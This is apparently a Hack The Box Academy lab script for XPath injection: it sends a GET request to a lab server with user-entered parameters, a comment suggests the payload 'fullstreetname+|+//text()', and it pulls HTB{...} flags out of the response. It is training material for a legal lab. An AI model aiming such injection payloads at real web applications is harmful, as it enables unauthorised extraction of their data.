# XPath - Data Exfiltration
# https://academy.hackthebox.com/module/204/section/2220

import requests
import re

baseurl = 'http://94.237.58.222:36629/index.php' # IP spawned from HTB
q_param = input('Enter a parameter for "q": ') # Use invalid data here like "invalid"
f_param = input('Enter a parameter for "f": ') # fullstreetname+|+//text()

r = requests.get(baseurl+'?q='+q_param+'&f='+f_param)

webresponse = r.text

matches = re.findall(r'HTB\{[^\}]*\}', webresponse)
for match in matches:
    print(match)